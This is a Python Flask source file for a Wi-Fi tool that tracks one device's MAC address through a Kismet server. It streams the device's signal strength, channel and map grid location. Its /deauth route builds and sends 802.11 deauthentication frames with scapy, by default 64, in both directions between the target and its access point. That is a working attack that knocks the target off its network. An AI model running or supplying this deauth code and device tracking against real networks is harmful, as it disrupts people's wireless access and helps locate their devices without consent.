import requests.exceptions
from flask import Flask, render_template, Response, redirect, url_for, request
from flask_bootstrap import Bootstrap
import json
import time
import scapy.layers.dot11
from scapy.all import sendp
from mac import Mac
import mgrs

mac = Mac()
app = Flask(__name__)
Bootstrap(app)
mgrs_converter = mgrs.MGRS()

@app.route('/', methods=['POST', 'GET'])
def home():
    try:
        mac.get_interfaces()
    except requests.exceptions.ConnectionError:
        return "<h2>Please start Kismet or check if your self.IP inside mac.py is pointing to the correct Kismet IP.</h2>"
    return render_template('index.html', mac=mac.mac, channels=mac.interfaces)

@app.route('/mac', methods=['GET', 'POST'])
def set_mac():
    mac.mac = request.form['mac']
    mac.best_seen = -120
    mac.last_seen_time = 0
    mac.last_best_time = 0
    return redirect(url_for('home', mac=mac))

@app.route('/df', methods=['POST', 'GET'])
def df():
    def generate():
        while True:
            response = {}
            results = mac.retrieve_mac()
            rssi = results[0]['kismet.common.signal.last_signal']
            mac.current_channel = results[0]['kismet.device.base.channel']
            mac.bssid = results[0]["dot11.device.last_bssid"]
            response[0] = 120 - (int(rssi) * -1)
            response[1] = rssi
            response[2] = mac.current_channel
            current_time = time.time()
            if rssi > mac.best_seen:
                mac.best_seen = rssi
                mac.last_best_time = current_time
                try:
                    mac.lat = results[0]['kismet.common.location.geopoint'][1]
                    mac.lon = results[0]['kismet.common.location.geopoint'][0]
                    mac.location = location_conversion(mac.lat, mac.lon)
                except TypeError:
                    pass
            response[3] = mac.best_seen
            time_since_best = int(time.time() - mac.last_best_time)
            mac.last_seen_time = current_time - results[0]['kismet.device.base.last_time']
            response[4] = time_since_best
            response[5] = mac.last_seen_time
            response[6] = mac.location
            return_string = 'data:' + json.dumps(response) + "\n\n"
            yield return_string
            time.sleep(.2)
    return Response(generate(), mimetype='text/event-stream')

@app.route('/<string:uuid>/<string:channel>', methods=['GET'])
def lock_channel(uuid, channel):
    uuid = json.loads(uuid)['uuid']
    channel = json.loads(channel)['channel']
    mac.lock_channel(uuid, channel)
    return f"New channel set for {uuid}"

@app.route('/hop/<string:uuid>/<string:option>', methods=['GET'])
def survey_channels(uuid, option):
    uuid = json.loads(uuid)['uuid']
    option = json.loads(option)['option']
    if option == "one":
        mac.survey_channels(uuid=uuid, span=mac.one_six_eleven_params)
    elif option == "two":
        mac.survey_channels(uuid=uuid, span=mac.two_full_params)
    elif option == "three":
        mac.survey_channels(uuid=uuid, span=mac.five_full_params)
    elif option == "four":
        mac.survey_channels(uuid=uuid, span="all")
    elif option == "five":
        mac.survey_channels(uuid=uuid, span="function_all")
    return f"New channels set for {uuid}"

@app.route("/deauth/<string:interface>/<string:reason>/<string:count>/<string:behavior>")
def deauth(interface, reason, count, behavior):
    interface = json.loads(interface)['interface']
    try:
        reason = int(json.loads(reason)['reason'])
    except ValueError:
        reason = 7
    try:
        count = int(json.loads(count)['count'])
    except ValueError:
        count = 64
    behavior = json.loads(behavior)['behavior']
    print(interface, reason, count, behavior)

    def shoot(behavior, count):
        if mac.mac == "FF:FF:FF:FF:FF:FF" or mac.mac == "":
            return "No target set, not shooting"
        target_mac = mac.mac.lower()
        bssid = mac.bssid.lower()
        dot11_bssid = scapy.layers.dot11.Dot11(
            type=0,
            subtype=12,
            addr1=target_mac,
            addr2=bssid,
            addr3=bssid,
        )
        deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
        frame_bssid = scapy.layers.dot11.RadioTap()/dot11_bssid/deauth_frame
        # If behavior is set to true, deauth frames of the same count will be sent to the target's BSSID using the
        # targets's MAC
        dot11_client = scapy.layers.dot11.Dot11(
            type=0,
            subtype=12,
            addr1=bssid,
            addr2=target_mac,
            addr3=bssid
        )
        frame_client = scapy.layers.dot11.RadioTap()/dot11_client/deauth_frame
        for num in range(0, count):
            sendp(frame_bssid, iface=interface, count=1)
            if behavior:
                sendp(frame_client, iface=interface, count=1)
    shoot(behavior=behavior, count=count)
    return f"{count} deauths sent to {mac.mac} from {mac.bssid}"

def location_conversion(lat, lon):
    if lat != "":
        location = mgrs_converter.toMGRS(lat, lon)
        return location
    else:
        return "0"


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5001)
